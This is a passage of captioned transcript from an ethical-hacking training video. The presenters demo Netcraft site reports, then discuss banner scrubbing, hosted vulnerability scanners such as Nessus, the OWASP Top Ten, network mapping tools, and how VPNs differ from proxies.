00:16:36.850\nWe don't tend to see those but\nwe've talked about using tools and\n\n381\n00:16:36.850 --> 00:16:38.540\ndemoed at least one tool for\nyou that does.\n\n382\n00:16:38.540 --> 00:16:40.130\nCan we bring back up Netcraft and\n\n383\n00:16:40.130 --> 00:16:42.610\njust we'll go to Mike's machine\nin a minute when he's ready?\n\n384\n00:16:42.610 --> 00:16:43.840\nI wanna go to the Netcraft site.\n\n385\n00:16:43.840 --> 00:16:46.462\nI showed you,\none way to do this was site reports.\n\n386\n00:16:46.462 --> 00:16:47.610\nI wanna show you some of the other\n\n387\n00:16:47.610 --> 00:16:51.390\nfeatures that were available there cuz\nit's such a powerful set of tools.\n\n388\n00:16:51.390 --> 00:16:52.830\nAnd so, we can go in and\n\n389\n00:16:52.830 --> 00:16:56.100\nwe can do operating system\nidentification as we took a look at.\n\n390\n00:16:56.100 --> 00:16:57.980\nWe can find out what web servers running.\n\n391\n00:16:57.980 --> 00:17:00.750\nWe could get all sorts of\ninformation from Netcraft.\n\n392\n00:17:00.750 --> 00:17:04.270\nAnd again, remember,\nNetcraft can be used directly online but\n\n393\n00:17:04.270 --> 00:17:05.740\nit's also a browser extension.\n\n394\n00:17:05.740 --> 00:17:08.340\nWe can essentially load\nthe toolbar into the browser and\n\n395\n00:17:08.340 --> 00:17:09.730\nuse it directly in our machine.\n\n396\n00:17:09.730 --> 00:17:12.920\nIt's up to us to decide how we\nwanna use a tool like this.\n\n397\n00:17:12.920 --> 00:17:14.850\nSo there's lots of different ways for\nus to do this.\n\n398\n00:17:14.850 --> 00:17:15.610\nAre you ready?\nCan we go to\n\n399\n00:17:15.610 --> 00:17:17.090\nMike's machine please just for a minute?\n\n400\n00:17:17.090 --> 00:17:18.010\nThank you very much.\n\n401\n00:17:18.010 --> 00:17:22.602\nSo we wanna be able to go to the,\n\n402\n00:17:22.602 --> 00:17:26.190\nI can't see\n>> The actual, let me find it.\n\n403\n00:17:26.190 --> 00:17:28.880\n>> Yeah I can't see,\nthe one we were talking about,\n\n404\n00:17:28.880 --> 00:17:30.659\nI can't see where you are so\n>> There we go.\n\n405\n00:17:30.659 --> 00:17:31.690\n>> Okay, so Mike has it.\n\n406\n00:17:31.690 --> 00:17:33.650\nSo on the left,\ncan you zoom in for a minute so\n\n407\n00:17:33.650 --> 00:17:36.789\nwe can see the left nav bar because\nI'm seeing it from across the studio.\n\n408\n00:17:36.789 --> 00:17:37.440\n>> [LAUGH]\n>> There we go,\n\n409\n00:17:37.440 --> 00:17:41.630\nso we could see there that we have Site\nReport which is what Mike had clicked on.\n\n410\n00:17:41.630 --> 00:17:46.010\nBut then as you scroll down, you'll see\nwe have Takedown Map, Phishing Map,\n\n411\n00:17:46.010 --> 00:17:50.300\nPopular Websites,\nall sorts of stuff there.\n\n412\n00:17:50.300 --> 00:17:54.000\nAnd we can find a lot of\nadditional information.\n\n413\n00:17:54.000 --> 00:17:57.960\nSo there's a lot of additional things\nthat we can do inside of there.\n\n414\n00:17:57.960 --> 00:18:01.110\nSo we're using, I think if I'm not\nmistaken, the Site Report one.\n\n415\n00:18:01.110 --> 00:18:01.670\n>> The Site Report, yes.\n\n416\n00:18:01.670 --> 00:18:04.418\n>> So lets do, I know we did,\nI think, New Horizons last time.\n\n417\n00:18:04.418 --> 00:18:08.446\nLet's do Amazon.com, just randomly.\n\n418\n00:18:08.446 --> 00:18:16.330\nSo we'll do Amazon.com, we'll take\na look at the Site Report there.\n\n419\n00:18:16.330 --> 00:18:18.120\nGive it just a minute to come back up,\n\n420\n00:18:18.120 --> 00:18:20.870\nand we'll just remind you of\nsome of the stuff that's there.\n\n421\n00:18:20.870 --> 00:18:23.720\nSo as we scroll down,\nwe can see, and we're not really\n\n422\n00:18:23.720 --> 00:18:26.930\nconcerned about when they registered and\nall that, we can bypass that, but\n\n423\n00:18:26.930 --> 00:18:30.740\nlet's go down to hosting history and what\nwe'll see there off to the right as web\n\n424\n00:18:30.740 --> 00:18:35.750\nserver, now this one doesn't show us,\nit says unknown for OS and web server.\n\n425\n00:18:35.750 --> 00:18:39.540\nThey're scrubbing that information out of\nthe banners, out of the host headers that\n\n426\n00:18:39.540 --> 00:18:44.840\nare coming back when we issue a get HTTP\nrequest to the web server to profile it\n\n427\n00:18:44.840 --> 00:18:48.690\nand as a result, they're smart, they've\ntaken they know, that's scrubbing that\n\n428\n00:18:48.690 --> 00:18:52.150\ninformation, gives them an advantage and\nhides it from hackers.\n\n429\n00:18:52.150 --> 00:18:53.940\nSo a lot of websites do this, but\n\n430\n00:18:53.940 --> 00:18:56.950\na lot don't and it's sort of just\na matter of probing to find out.\n\n431\n00:18:56.950 --> 00:19:01.090\nBut banner grabbing can be useful if we\ndo get the OS information but we may not.\n\n432\n00:19:01.090 --> 00:19:03.958\nWe just don't know what's there,\nso we have to try it and look and\n\n433\n00:19:03.958 --> 00:19:06.879\nof course as we continue to scroll\ndown we may see other information\n\n434\n00:19:06.879 --> 00:19:10.114\nthat will be helpful but if they have\nscrubbed that they may not give us a lot\n\n435\n00:19:10.114 --> 00:19:13.490\nof additional information that may be\nvaluable or would help us to see that.\n\n436\n00:19:13.490 --> 00:19:16.540\nIt's kind of a hit and\nmiss with a tool like that.\n\n437\n00:19:16.540 --> 00:19:18.420\nSo we just wanna be thinking about that.\n\n438\n00:19:18.420 --> 00:19:22.090\nObviously, making sure that we scrub\nthat information is a great way\n\n439\n00:19:22.090 --> 00:19:24.090\nto prevent that from being seen.\n\n440\n00:19:24.090 --> 00:19:27.110\nSome systems actually go to the trouble\nof putting up fake information.\n\n441\n00:19:27.110 --> 00:19:29.580\nThey put fake headers up and\nthere are fake banners so\n\n442\n00:19:29.580 --> 00:19:33.580\nthat it looks like you're running\nsomething that you're not misdirecting.\n\n443\n00:19:33.580 --> 00:19:36.750\nEssentially, the hacker and the thinking\nthey can attack using some methodology\n\n444\n00:19:36.750 --> 00:19:39.470\nwhen in fact, you're running\nthese ActApps kind of platform.\n\n445\n00:19:39.470 --> 00:19:44.100\nSo devious and deceptive, yes,\nbut we actually can do that.\n\n446\n00:19:44.100 --> 00:19:48.080\nWe can use a tool like server\nmask which will let us mask and\n\n447\n00:19:48.080 --> 00:19:49.690\nhide that information.\n\n448\n00:19:49.690 --> 00:19:51.980\nSo that's one tool that\nwill let us redo that or\n\n449\n00:19:51.980 --> 00:19:56.060\nsince we change the banners in\nthe host stairs, we can go in and\n\n450\n00:19:56.060 --> 00:20:00.230\ndepending on whether it's Linux or\nWindows based for the web hosting.\n\n451\n00:20:00.230 --> 00:20:05.180\nIn Apache we can use the headers module\nto be able to go in and modify that.\n\n452\n00:20:05.180 --> 00:20:06.840\nSo we can go to modify that.\n\n453\n00:20:06.840 --> 00:20:09.200\nWe can go in, we can use tools.\n\n454\n00:20:09.200 --> 00:20:12.540\nLike I said, we can go in and\nthere's a tool that Microsoft puts out\n\n455\n00:20:12.540 --> 00:20:16.850\nthat will reconfigure that for you and let\nyou take that out of the IAS server and\n\n456\n00:20:16.850 --> 00:20:18.850\nprevent that information form being seen.\n\n457\n00:20:18.850 --> 00:20:22.210\nSo lot of different ways to do that, it's\nall just a matter of what we choose to do.\n\n458\n00:20:22.210 --> 00:20:23.210\nBut that's gonna be valuable,\n\n459\n00:20:23.210 --> 00:20:25.910\nsomething we should consider,\nwe should be thinking about.\n\n460\n00:20:25.910 --> 00:20:28.320\nWe've talked about vulnerability\nscanning and going in and\n\n461\n00:20:28.320 --> 00:20:30.800\nlooking for\nall sorts of different vulnerabilities.\n\n462\n00:20:30.800 --> 00:20:34.990\nWe've talked about open ports, we could\nbe looking at services, things like that.\n\n463\n00:20:34.990 --> 00:20:36.770\nI mentioned Nessus as a tool.\n\n464\n00:20:36.770 --> 00:20:39.880\nWe didn't demo Nessus but\nwe can take a look at it right now online.\n\n465\n00:20:39.880 --> 00:20:41.790\nCan you bring up the Nessus website?\n\n466\n00:20:41.790 --> 00:20:43.380\nThat'll be N-E-S-S-U-S, right?\n\n467\n00:20:43.380 --> 00:20:44.080\nNessus.\n\n468\n00:20:44.080 --> 00:20:47.833\nYou used to be a tool that you would\nsee in Linux builds, was bought and\n\n469\n00:20:47.833 --> 00:20:50.470\nbecame kind of an online\nsystem these days.\n\n470\n00:20:50.470 --> 00:20:54.320\nIt's now available, cloud enabled, so\nwe can go out and use it, as well.\n\n471\n00:20:54.320 --> 00:20:57.040\nAnd so, we can go out and\ntake a look at a tool like that.\n\n472\n00:20:57.040 --> 00:20:58.302\nTenable owns them now, right?\n\n473\n00:20:58.302 --> 00:20:59.478\nSo we'll probably go to tenable.\n\n474\n00:20:59.478 --> 00:21:01.370\ncom, and then,\nyou'll find the Nessus tool.\n\n475\n00:21:02.570 --> 00:21:07.160\nSo they got bought a couple years ago, so\nnow it's kind of a cloud-based solution.\n\n476\n00:21:07.160 --> 00:21:09.390\nBut the nice thing is they\ndo give you a demo and\n\n477\n00:21:09.390 --> 00:21:12.090\ngive you the opportunity to request it and\nset it up and play with it.\n\n478\n00:21:12.090 --> 00:21:15.085\nSo you need to go in and\ntake a look at like an enterprise version,\n\n479\n00:21:15.085 --> 00:21:16.660\nall these different things.\n\n480\n00:21:16.660 --> 00:21:20.380\nBut it's essentially cloud based\nonline vulnerability scanning.\n\n481\n00:21:20.380 --> 00:21:21.940\nAnd tools like this are very powerful.\n\n482\n00:21:21.940 --> 00:21:25.811\nLet's talk about the differentiator\nhere for a minute and why a tool like\n\n483\n00:21:25.811 --> 00:21:29.696\nthis could be so valuable for us to\nuse with regards to network scanning.\n\n484\n00:21:29.696 --> 00:21:32.950\nI don't necessarily like hosted\ntools all the time, I don't think,\n\n485\n00:21:32.950 --> 00:21:35.709\nalthough I do think there's\ndefinitely room for them, and\n\n486\n00:21:35.709 --> 00:21:39.295\nI think there's value for them, but\nI don't always like to give someone else\n\n487\n00:21:39.295 --> 00:21:43.010\ncontrol over what my options are,\nwhat the output will be and how I get it.\n\n488\n00:21:43.010 --> 00:21:48.560\nBut there is one overwhelming value at\nconsideration with tools like this,\n\n489\n00:21:48.560 --> 00:21:50.690\nthe vendor's keeping them up to date, and\n\n490\n00:21:50.690 --> 00:21:53.520\nif the vendor's a big vendor,\nTenable is they're a huge company.\n\n491\n00:21:53.520 --> 00:21:56.220\nAnd the security space, and\nthe software security space, and\n\n492\n00:21:56.220 --> 00:22:00.215\nthe cloud services space, and\nthey're good at integrating common and\n\n493\n00:22:00.215 --> 00:22:04.220\nwell-known threat intelligence deeds\ninto their tool, as Tenable does.\n\n494\n00:22:04.220 --> 00:22:06.390\nThey're gonna be up to date with\nthe latest vulnerabilities and\n\n495\n00:22:06.390 --> 00:22:08.890\nyou're gonna find that\nyou are going to scan and\n\n496\n00:22:08.890 --> 00:22:13.320\nfind a lot more things using a tool like\nthis, then you may a tool you download and\n\n497\n00:22:13.320 --> 00:22:17.278\nhave to update yourself or that the vendor\nmay update but not update as frequently.\n\n498\n00:22:17.278 --> 00:22:20.750\nSo there is actually is a fair amount\nof value in using some of these hosted\n\n499\n00:22:20.750 --> 00:22:22.230\ntools but\nyou have to pick the right vendor.\n\n500\n00:22:22.230 --> 00:22:23.586\nIt's like anything else.\n\n501\n00:22:23.586 --> 00:22:27.122\nThere's ten vendors, five of them may or\nmay not not be good, but the reality is,\n\n502\n00:22:27.122 --> 00:22:28.570\nfive of them may be outstanding.\n\n503\n00:22:29.680 --> 00:22:32.984\nNot endorsing any tool per se, but\n\n504\n00:22:32.984 --> 00:22:38.020\nvendors and\ntool sets from vendors like this,\n\n505\n00:22:38.020 --> 00:22:42.330\nthat are kept up to date are gonna be very\nvaluable to us in this particular regard.\n\n506\n00:22:42.330 --> 00:22:46.030\nSo we're not gonna go in and\ndo a full demo and set up a license and\n\n507\n00:22:46.030 --> 00:22:49.230\nview the whole thing, but\nyou can easily go in and play with Nessus.\n\n508\n00:22:49.230 --> 00:22:49.810\nYou can go in and\n\n509\n00:22:49.810 --> 00:22:53.955\nlook at tools like GFI LanGuard, which is\nanother tool that you would have to buy.\n\n510\n00:22:53.955 --> 00:22:57.415\nBut you could subscribe to online,\nget a free, I think 7 or\n\n511\n00:22:57.415 --> 00:22:59.555\n14 day demo license for.\n\n512\n00:22:59.555 --> 00:23:03.522\nThere's Qualys FreeScan that\nyou can go out and use as well.\n\n513\n00:23:03.522 --> 00:23:05.202\nThey're available online.\n\n514\n00:23:05.202 --> 00:23:09.446\nYou can go out and look at the OWASP\ntop ten risks and vulnerabilities list.\n\n515\n00:23:09.446 --> 00:23:12.824\nCan we go to the OWASP website\nreal quick at owasp.org.\n\n516\n00:23:12.824 --> 00:23:16.869\nWe'll take a look at that, we will bring\nthat up as soon as Mike has that up and\n\n517\n00:23:16.869 --> 00:23:17.449\nrunning.\n\n518\n00:23:17.449 --> 00:23:21.194\nDo OWASP top ten actually, specifically,\nnot just the OWASP list cuz you get\n\n519\n00:23:21.194 --> 00:23:24.652\nthe OWASP website you have to drill\nthrough and find all the projects but\n\n520\n00:23:24.652 --> 00:23:27.320\nif we go back you'll see OWASP\nhas the top ten site now.\n\n521\n00:23:27.320 --> 00:23:31.356\nI mentioned this in one of the earlier\nepisodes, the top 10 vulnerability lists\n\n522\n00:23:31.356 --> 00:23:35.560\nfor web vulnerabilities is the 2013\nlist currently revised every 3 years.\n\n523\n00:23:35.560 --> 00:23:37.631\nThey put the call out to do the update for\n16,\n\n524\n00:23:37.631 --> 00:23:40.555\nthe mast head has the announcement there,\nit will be published,\n\n525\n00:23:40.555 --> 00:23:44.115\nthe new list will be published in the\nbeginning of 17 so you can see that there,\n\n526\n00:23:44.115 --> 00:23:47.236\nbut there are other top 10 lists,\nit's all sort of stuff up there.\n\n527\n00:23:47.236 --> 00:23:50.512\nThere's one on vulnerabilities\nwith regards to privacy, and\n\n528\n00:23:50.512 --> 00:23:55.035\nthere's like a whole list on privacy and\nprivacy concerns in the cloud we can use.\n\n529\n00:23:55.035 --> 00:23:56.547\nThere are database vulnerabilities and\n\n530\n00:23:56.547 --> 00:23:59.624\ndeveloper vulnerabilities that we should\nbe aware of and Top ten lists for those.\n\n531\n00:23:59.624 --> 00:24:02.841\nSo you've got a bunch of different\nprojects that you could look at,\n\n532\n00:24:02.841 --> 00:24:04.938\nthat are very valuable for\nus to be aware of.\n\n533\n00:24:04.938 --> 00:24:07.772\nA whole bunch of different\nvulnerabilities, in other words,\n\n534\n00:24:07.772 --> 00:24:11.500\nthat we'd want to take on and ultimately\nover time make sure we are comfortable.\n\n535\n00:24:11.500 --> 00:24:14.524\nWe'll at some point drill down\non the OWASP top ten list and\n\n536\n00:24:14.524 --> 00:24:16.560\nmake sure that we explain them as you and\n\n537\n00:24:16.560 --> 00:24:19.906\nI have in various programs over\nthe time we've been doing this.\n\n538\n00:24:19.906 --> 00:24:22.821\nBut it's good for you as certified\nethical hackers to go out,\n\n539\n00:24:22.821 --> 00:24:24.229\ntake a look at the OWASP site.\n\n540\n00:24:24.229 --> 00:24:25.022\nVery, very important.\n\n541\n00:24:25.022 --> 00:24:26.109\nA lot of good information there.\n\n542\n00:24:26.109 --> 00:24:29.168\nWe've mentioned the SANS site before,\nwe mentioned OWASP.\n\n543\n00:24:29.168 --> 00:24:32.127\nWe mentioned the Cloud Security Alliance\nfor cloud related stuff.\n\n544\n00:24:32.127 --> 00:24:35.611\nAll these sites and more are gonna\nprovide a wealth of information.\n\n545\n00:24:35.611 --> 00:24:38.232\nBut again, it's free and\nit's gonna be very valuable.\n\n546\n00:24:38.232 --> 00:24:42.295\nBut it's also vetted and it is gonna\nbe legitimately good information.\n\n547\n00:24:42.295 --> 00:24:44.422\nAnd that's important for\nyou to differentiate with as well.\n\n548\n00:24:44.422 --> 00:24:47.310\nDon't wanna leave out our friends\non the mobile platform side, right?\n\n549\n00:24:47.310 --> 00:24:51.069\nWe got tools for all sorts of mobile\ndevices that we could use for scanning.\n\n550\n00:24:51.069 --> 00:24:53.920\nWe've got specifically\narchitected applications and\n\n551\n00:24:53.920 --> 00:24:57.079\ncloud based services that deal\nwith mobile platforms today.\n\n552\n00:24:57.079 --> 00:25:00.647\nCome such a big thing today that we\nreally have to think about that.\n\n553\n00:25:00.647 --> 00:25:03.856\nAllowing somebody to bring in a mobile\ndevice, hook it up to the corporate\n\n554\n00:25:03.856 --> 00:25:06.774\nnetwork as we've talked about can\nbe a very large vulnerability.\n\n555\n00:25:06.774 --> 00:25:10.794\nAnd if we are not scanning it using a new\nmobile device management capabilities,\n\n556\n00:25:10.794 --> 00:25:14.473\nand/or some sort of policy based control,\nwe're gonna have a problem.\n\n557\n00:25:14.473 --> 00:25:19.421\nCuz chances are good, studies show there's\na raging epidemic of malware out there\n\n558\n00:25:19.421 --> 00:25:23.309\nrunning on these non-corporate\ncontrolled consumer devices,\n\n559\n00:25:23.309 --> 00:25:25.210\nwe won't mention any names.\n\n560\n00:25:25.210 --> 00:25:26.908\nIphone, Android, and\nI'm not gonna be bitter and\n\n561\n00:25:26.908 --> 00:25:28.656\nmention them because we like them,\nthey're good.\n\n562\n00:25:28.656 --> 00:25:32.587\n>> [LAUGH]\n>> You know better, you know better.\n\n563\n00:25:32.587 --> 00:25:34.180\nYou know what my take on that would be.\n\n564\n00:25:34.180 --> 00:25:36.472\n>> We're all switching to BlackBerry\nbefore the end of the week, I think.\n\n565\n00:25:36.472 --> 00:25:40.479\n>> Hey, the zombie apocalypse is coming\nmy friend and if you're not prepared,\n\n566\n00:25:40.479 --> 00:25:42.790\nwoe to you is all I have to say, right?\n\n567\n00:25:42.790 --> 00:25:45.537\nSo whatever that device is,\nall kidding aside, right?\n\n568\n00:25:45.537 --> 00:25:49.107\nWhatever it may be and as I think I\npointed out in the very first episode in\n\n569\n00:25:49.107 --> 00:25:51.069\nthe whole series for CH that we put out,\n\n570\n00:25:51.069 --> 00:25:55.141\nwe're going to talk about how to hack in\nand monitor all those mobile platforms.\n\n571\n00:25:55.141 --> 00:25:58.827\nAnd every platform including Blackberry\nhas potential weaknesses and liabilities,\n\n572\n00:25:58.827 --> 00:26:01.815\nand we have to be aware of that\nregardless of how secure we think we are.\n\n573\n00:26:01.815 --> 00:26:04.547\nThere's always a way in if\nthe hacker is looking for it, and\n\n574\n00:26:04.547 --> 00:26:06.580\nis prepared to figure\nout how to exploit it.\n\n575\n00:26:06.580 --> 00:26:09.130\nSo, we do wanna make\nsure we're aware of that.\n\n576\n00:26:09.130 --> 00:26:11.814\nThinking about that.\nBut we tools specifically for that.\n\n577\n00:26:11.814 --> 00:26:15.635\nRetina CS which is a mobile scanning\ndevice tool or a mobile scanning platform\n\n578\n00:26:15.635 --> 00:26:19.005\ntool for mobile devices could be\nused to look for vulnerabilities.\n\n579\n00:26:19.005 --> 00:26:21.919\nOther security metrics in\ntheir mobile scan product and\n\n580\n00:26:21.919 --> 00:26:23.850\njust a wealth of information there.\n\n581\n00:26:23.850 --> 00:26:27.583\nNessus has a vulnerability scanning engine\nthat runs of mobile devices or runs for\n\n582\n00:26:27.583 --> 00:26:28.725\nmobile devices as well.\n\n583\n00:26:28.725 --> 00:26:31.860\nSo we've taken a look at some,\nthere's many others.\n\n584\n00:26:31.860 --> 00:26:34.694\nJust wanna make sure we don't leave\nthose out or forget about them, right?\n\n585\n00:26:34.694 --> 00:26:37.541\nCuz there is so much interest\ntoday in this mobile platform, so\n\n586\n00:26:37.541 --> 00:26:39.326\nwe wanna make sure we account for that.\n\n587\n00:26:39.326 --> 00:26:42.400\nWe've talked a lot about the need\nto have good documentation.\n\n588\n00:26:42.400 --> 00:26:46.249\nSpecifically, draw a very compelling and\naccurate picture of our network,\n\n589\n00:26:46.249 --> 00:26:48.273\nand make sure that we can document that.\n\n590\n00:26:48.273 --> 00:26:51.589\nOne of the things I see, and I've\ntalked about this a lot as an auditor,\n\n591\n00:26:51.589 --> 00:26:55.234\nas I go in and talk to customers, and to\ndo audits, and to do assessment work for\n\n592\n00:26:55.234 --> 00:26:57.360\nthem, is there's not good documentation.\n\n593\n00:26:57.360 --> 00:27:01.896\nThey don't have a network map, but\nI can't easily identify what that is or\n\n594\n00:27:01.896 --> 00:27:02.839\nwhat that was.\n\n595\n00:27:02.839 --> 00:27:05.927\nIn terms of what ID that is or\nwhat machine that is or\n\n596\n00:27:05.927 --> 00:27:07.948\nwhatever that case may be.\n\n597\n00:27:07.948 --> 00:27:11.106\nSo we wanna be thinking about that,\nwanna know that,\n\n598\n00:27:11.106 --> 00:27:13.927\nthat's also an issue\nthat we have to consider.\n\n599\n00:27:13.927 --> 00:27:16.550\nAnd we have to think about how\nwe're gonna document that, and\n\n600\n00:27:16.550 --> 00:27:18.625\nhow we're gonna lay that\nstuff out there for us.\n\n601\n00:27:18.625 --> 00:27:22.493\nOur Qualys FreeScan, I believe is what I\nwas just talking about a moment ago just\n\n602\n00:27:22.493 --> 00:27:25.957\nto make sure that we capture that\nbecause I know somebody was asking, so\n\n603\n00:27:25.957 --> 00:27:28.577\njust to make sure we don't\nmiss that in case I forget.\n\n604\n00:27:28.577 --> 00:27:31.217\nSo, thinking about how we're\ngonna document networks and\n\n605\n00:27:31.217 --> 00:27:32.705\ndiagram them is very important.\n\n606\n00:27:32.705 --> 00:27:36.869\nNetwork topology can be one of the banes\nof an administrator's existence but\n\n607\n00:27:36.869 --> 00:27:41.160\nit can be a liberating tool that enables\nyou to architect more secure enterprise\n\n608\n00:27:41.160 --> 00:27:44.633\nsystems if you are good at keeping\ntrack of where everything is.\n\n609\n00:27:44.633 --> 00:27:48.430\nTools like network topology mapper,\nnetwork view, visual route.\n\n610\n00:27:48.430 --> 00:27:50.728\nI've talked about a whole\nbunch of these before.\n\n611\n00:27:50.728 --> 00:27:52.380\nAny or all of them are gonna be valuable.\n\n612\n00:27:52.380 --> 00:27:55.607\nMost of these, unfortunately,\nyou're gonna have to go out and buy.\n\n613\n00:27:55.607 --> 00:27:57.277\nThey're usually not for free.\n\n614\n00:27:57.277 --> 00:27:59.570\nSorry, but that's just the way it is.\n\n615\n00:27:59.570 --> 00:28:01.989\nAt one point,\nVisio used to be able to do a dump and\n\n616\n00:28:01.989 --> 00:28:04.777\nscan all that stuff from the network and\nput it in there.\n\n617\n00:28:04.777 --> 00:28:07.360\nBut you have to buy Visi,\nand it's not cheap, so\n\n618\n00:28:07.360 --> 00:28:11.395\nthese are the tools unfortunately that\nsometimes you gotta spend money on.\n\n619\n00:28:11.395 --> 00:28:14.694\nI often tell my customers, hey,\nif you're gonna go out and spend money,\n\n620\n00:28:14.694 --> 00:28:18.208\nyou'll pick a tool that you like, get\nthat, license it and then use that, but\n\n621\n00:28:18.208 --> 00:28:19.235\nthen actually use it.\n\n622\n00:28:19.235 --> 00:28:21.614\nDon't spend the money and\nthen say, yeah we have it.\n\n623\n00:28:21.614 --> 00:28:24.722\nWhen I come around to do an audit say,\nyeah but I don't have the documentation.\n\n624\n00:28:24.722 --> 00:28:26.505\n>> [LAUGH]\n>> Why did you spend the money to buy\n\n625\n00:28:26.505 --> 00:28:28.305\nthe tool if your not gonna run the tool,\nright?\n\n626\n00:28:28.305 --> 00:28:29.061\nSo, keep that in mind.\n\n627\n00:28:29.061 --> 00:28:31.575\nThere's a lot of different\ntools out there.\n\n628\n00:28:31.575 --> 00:28:35.804\nAs I said, number of them used probably\nmore interesting ones that most people\n\n629\n00:28:35.804 --> 00:28:37.739\ntend to use been around a long time.\n\n630\n00:28:37.739 --> 00:28:42.256\nBut there's a million different versions,\nNetMapper, Spiceworks has a real good\n\n631\n00:28:42.256 --> 00:28:47.140\ntool, WhatsConnected is a good one from\nWhatsUp Gold, they're always a good one.\n\n632\n00:28:47.140 --> 00:28:50.388\nIPsonar from Lumeta would\nbe a good one as well.\n\n633\n00:28:50.388 --> 00:28:54.635\nThere's a whole bunch of different ones\nout three, OPNET makes NetMapper, I think,\n\n634\n00:28:54.635 --> 00:28:55.520\nif they still do.\n\n635\n00:28:55.520 --> 00:28:56.397\nThey may or may not anymore.\n\n636\n00:28:56.397 --> 00:28:59.470\nBut they used to,\nI used to use NetMapper a lot as well.\n\n637\n00:28:59.470 --> 00:29:01.146\nSo, there's a whole bunch of\ndifferent ones out there.\n\n638\n00:29:01.146 --> 00:29:04.180\nAgain on the mobile side,\nbunch of stuff there.\n\n639\n00:29:04.180 --> 00:29:04.900\nWe have scanny.\n\n640\n00:29:04.900 --> 00:29:06.800\nThere's a kind of cool name for a tool.\n\n641\n00:29:06.800 --> 00:29:08.699\nWe have scanny, right?\n\n642\n00:29:08.699 --> 00:29:10.730\nThere's NetMaster.\n\n643\n00:29:10.730 --> 00:29:12.766\nThere is the network Swiss army knife.\n\n644\n00:29:12.766 --> 00:29:16.422\nThere's a whole bunch of different ones\nout there that could be used on the mobile\n\n645\n00:29:16.422 --> 00:29:17.510\nplatforms as well.\n\n646\n00:29:17.510 --> 00:29:20.467\nIt's really just a matter going out and\nfinding, just Google for\n\n647\n00:29:20.467 --> 00:29:23.278\nmobile based network scanning or\nnetwork management tools.\n\n648\n00:29:23.278 --> 00:29:25.999\nYou'll find a whole bunch for\nnetwork diagraming and\n\n649\n00:29:25.999 --> 00:29:27.980\nnetwork management out there.\n\n650\n00:29:27.980 --> 00:29:29.705\nThere's just a million different things.\n\n651\n00:29:29.705 --> 00:29:32.559\nWe talked a lot about in\nthe prior episode and\n\n652\n00:29:32.559 --> 00:29:36.120\nshowed you how to set up proxies and\nhow to chain proxy.\n\n653\n00:29:36.120 --> 00:29:39.707\nWe had a very interesting conversation\noffline after the episode.\n\n654\n00:29:39.707 --> 00:29:42.402\nWhen somebody asked hey,\nwhat's the difference, essentially and\n\n655\n00:29:42.402 --> 00:29:43.991\nwhat's up with this whole proxy thing?\n\n656\n00:29:43.991 --> 00:29:45.834\nWhat's the difference between a VPN and\na proxy?\n\n657\n00:29:45.834 --> 00:29:46.547\nAre they the same?\n\n658\n00:29:46.547 --> 00:29:49.989\nIs the VPN doing the same thing,\nif so why would I use a proxy?\n\n659\n00:29:49.989 --> 00:29:51.245\nIt was a great conversation,\n\n660\n00:29:51.245 --> 00:29:54.320\nI think we helped to clarify\nthe difference between VPN's and proxies.\n\n661\n00:29:54.320 --> 00:29:56.990\nAnd I was thinking,\nit's probably a good idea for\n\n662\n00:29:56.990 --> 00:29:59.725\nus to replay that conversation\nbriefly here just so\n\n663\n00:29:59.725 --> 00:30:03.510\neverybody that was listening to it\nlive when we did it in the chat.\n\n664\n00:30:03.510 --> 00:30:06.150\nActually gets the benefit of it because\nyou know there may be some confusion and\n\n665\n00:30:06.150 --> 00:30:08.073\nmaybe not everybody's clear\non what the difference is.\n\n666\n00:30:08.073 --> 00:30:11.300\nSo, Mike and I are gonna have\nthat conversation again here.\n\n667\n00:30:11.300 --> 00:30:14.209\nJust for a minute just to kind of at\na high level summarize that difference.\n\n668\n00:30:14.209 --> 00:30:19.310\nSo, we were talking about the differences\nbetween what a proxy and a VPN does.\n\n669\n00:30:19.310 --> 00:30:23.128\nAnd you made a really great I think high\nlevel summary point about the VPN and\n\n670\n00:30:23.128 --> 00:30:24.716\nwhat it does versus the proxy.\n\n671\n00:30:24.716 --> 00:30:26.761\nMind just telling us about that again?\n\n672\n00:30:26.761 --> 00:30:29.357\n>> Absolutely.\nThe big thing about a VPN is it's designed\n\n673\n00:30:29.357 --> 00:30:33.943\nto encapsulate your traffic and protect\nit as it travels across an unsecure\n\n674\n00:30:33.943 --> 00:30:36.660\nportion of a network\nlike say the Internet.\n\n675\n00:30:36.660 --> 00:30:38.532\nYou're at home and\nyou're trying to connect to work, so\n\n676\n00:30:38.532 --> 00:30:39.595\nit's going to encapsulate it.\n\n677\n00:30:39.595 --> 00:30:42.900\nIt's gonna wrap your packet up\nin that tunneling protocol.\n\n678\n00:30:42.900 --> 00:30:44.688\nWhatever that might be.\nAdd an extra header and\n\n679\n00:30:44.688 --> 00:30:49.025\nfooter with the source and destination\nof the tunnel, but inside that,\n\n680\n00:30:49.025 --> 00:30:53.221\nyour packet still resides with\nthe original source and destination,\n\n681\n00:30:53.221 --> 00:30:56.390\nIP address, your data,\nand things like that.\n\n682\n00:30:56.390 --> 00:31:00.116\nSo it's not really hiding where you are,\nwhere you're coming from,\n\n683\n00:31:00.116 --> 00:31:01.758\nbut it does make it difficult or\n\n684\n00:31:01.758 --> 00:31:05.949\nif near impossible for them to get into\nthose packets because it is encrypted.\n\n685\n00:31:05.949 --> 00:31:09.810\nBut if you’re tunneling out to\nsay one of these organizations.\n\n686\n00:31:09.810 --> 00:31:13.607\nYou’re making a VPN connection\nto a cloud service provider.\n\n687\n00:31:13.607 --> 00:31:17.760\nAnd then from there you are going\non to some other website.\n\n688\n00:31:17.760 --> 00:31:21.755\nUnderstand your traffic is not protected,\nor not being hidden at that point.\n\n689\n00:31:21.755 --> 00:31:26.260\nWhereas with a proxy,\nyou are anonymizing yourself.\n\n690\n00:31:26.260 --> 00:31:26.854\nYou're hiding your aggression.\n\n691\n00:31:26.854 --> 00:31:30.464\nEspecially if you, as you were saying,\ntalking about going through several.\n\n692\n00:31:30.464 --> 00:31:32.286\n>> Daisy-chaining.\n>> Daisy-chaining those proxies.\n\n693\n00:31:32.286 --> 00:31:33.806\n>> Yeah [COUGH] Excuse me.\n\n694\n00:31:33.806 --> 00:31:35.302\nAbsolutely, as I try to speak and\n\n695\n00:31:35.302 --> 00:31:37.551\ndon't quite have enough\nair to get the words out.\n\n696\n00:31:37.551 --> 00:31:41.023\nSo absolutely, in terms of what\nwe're talking about and really,\n\n697\n00:31:41.023 --> 00:31:44.252\nwe just want to frame it this way,\nlet's make it very simple.\n\n698\n00:31:44.252 --> 00:31:47.165\nMike was absolutely correct and\ngave a great explanation of both but\n\n699\n00:31:47.165 --> 00:31:49.783\nlet's just strip it down to\nmake 